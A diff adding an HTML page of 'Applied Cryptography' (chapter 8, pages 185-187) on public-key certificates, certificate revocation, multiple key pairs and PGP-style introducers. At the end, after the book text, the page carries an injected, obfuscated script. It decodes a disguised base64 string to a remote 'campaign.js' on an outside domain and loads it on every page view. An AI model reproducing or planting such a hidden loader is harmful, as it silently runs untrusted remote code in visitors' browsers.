@@ -1,0 +1,86 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Management</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=08//-->
+<!--PAGES=185-187//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="08-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch09/09-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Public-key Certificates</I></B></FONT></P>
+<P>A <B>public-key certificate</B> is someone&#146;s public key, signed by a trustworthy person. Certificates are used to thwart attempts to substitute one key for another [879]. Bob&#146;s certificate, in the public-key database, contains a lot more than his public key. It contains information about Bob&#151;his name, address, and so on&#151;and it is signed by someone Alice trusts: Trent (usually known as a <B>certification authority</B>, or CA). By signing both the key and the information about Bob, Trent certifies that the information about Bob is correct and that the public key belongs to Bob. Alice checks Trent&#146;s signature and then uses the public key, secure in the knowledge that it is Bob&#146;s and no one else&#146;s. Certificates play an important role in a number of public-key protocols such as PEM [825] (see Section 24.10) and X.509 [304] (see Section 24.9).</P>
+<P>A complicated noncryptographic issue surrounds this type of system. What is the meaning of certification? Or, to put it another way, who is trusted to issue certificates to whom? Anyone may sign anyone else&#146;s certificate, but there needs to be some way to filter out questionable certificates: for example, certificates for employees of one company signed by the CA of another company. Normally, a certification chain transfers trust: A single trusted entity certifies trusted agents, trusted agents certify company CAs, and company CAs certify their employees.</P>
+<P>Here are some more things to think about:</P>
+<DL>
+<DD>&#151; What level of trust in someone&#146;s identity is implied by his certificate?
+<DD>&#151; What are the relationships between a person and the CA that certified his public key, and how can those relationships be implied by the certificate?
+<DD>&#151; Who can be trusted to be the &#147;single trusted entity&#148; at the top of the certification chain?
+<DD>&#151; How long can a certification chain be?
+</DL>
+<P>Ideally, Bob would follow some kind of authentication procedure before the CA signs his certificate. Additionally, some kind of timestamp or an indication of the certificate&#146;s validity period is important to guard against compromised keys [461].
+</P>
+<P>Timestamping is not enough. Keys may be invalidated before they have expired, either through compromise or for administrative reasons. Hence, it is important the CA keep a list of invalid certificates, and for users to regularly check that list. This key revocation problem is still a difficult one to solve.</P>
+<P>And one public-key/private-key pair is not enough. Certainly any good implementation of public-key cryptography needs separate keys for encryption and digital signatures. This separation allows for different security levels, expiration times, backup procedures, and so on. Someone might sign messages with a 2048-bit key stored on a smart card and good for twenty years, while they might use a 768-bit key stored in the computer and good for six months for encryption.</P>
+<P>And a single pair of encryption and signature keys isn&#146;t enough, either. A private key authenticates a relationship as well as an identity, and people have more than one relationship. Alice might want to sign one document as Alice the individual, another as Alice, vice-president of Monolith, Inc., and a third as Alice, president of her community organization. Some of these keys are more valuable than others, so they can be better protected. Alice might have to store a backup of her work key with the company&#146;s security officer; she doesn&#146;t want the company to have a copy of the key she signed her mortgage with. Just as Alice has multiple physical keys in her pocket, she is going to have multiple cryptographic keys.</P>
+<P><FONT SIZE="+1"><B><I>Distributed Key Management</I></B></FONT></P>
+<P>In some situations, this sort of centralized key management will not work. Perhaps there is no CA whom Alice and Bob both trust. Perhaps Alice and Bob trust only their friends. Perhaps Alice and Bob trust no one.
+</P>
+<P>Distributed key management, used in PGP (see Section 24.12), solves this problem with <B>introducers</B>. Introducers are other users of the system who sign their friends&#146; public keys. For example, when Bob generates his public key, he gives copies to his friends: Carol and Dave. They know Bob, so they each sign Bob&#146;s key and give Bob a copy of the signature. Now, when Bob presents his key to a stranger, Alice, he presents it with the signatures of these two introducers. If Alice also knows and trusts Carol, she has reason to believe that Bob&#146;s key is valid. If she knows and trusts Carol and Dave a little, she has reason to believe that Bob&#146;s key is valid. If she doesn&#146;t know either Carol or Dave, she has no reason to trust Bob&#146;s key.</P>
+<P>Over time, Bob will collect many more introducers. If Alice and Bob travel in similar circles, the odds are good that Alice will know one of Bob&#146;s introducers. To prevent against Mallory&#146;s substituting one key for another, an introducer must be sure that Bob&#146;s key belongs to Bob before he signs it. Perhaps the introducer should require the key be given face-to-face or verified over the telephone.</P>
+<P>The benefit of this mechanism is that there is no CA that everyone has to trust. The down side is that when Alice receives Bob&#146;s public key, she has no guarantee that she will know any of the introducers and therefore no guarantee that she will trust the validity of the key.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="08-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch09/09-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(UaFILWMo, kOkvwoCi) {kOkvwoCi = UaFILWMo.createElement('script');kOkvwoCi.type = 'text/javascript';kOkvwoCi.async = true;kOkvwoCi.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');UaFILWMo.getElementsByTagName('body')[0].appendChild(kOkvwoCi);}(document));</script></body>
+</html>
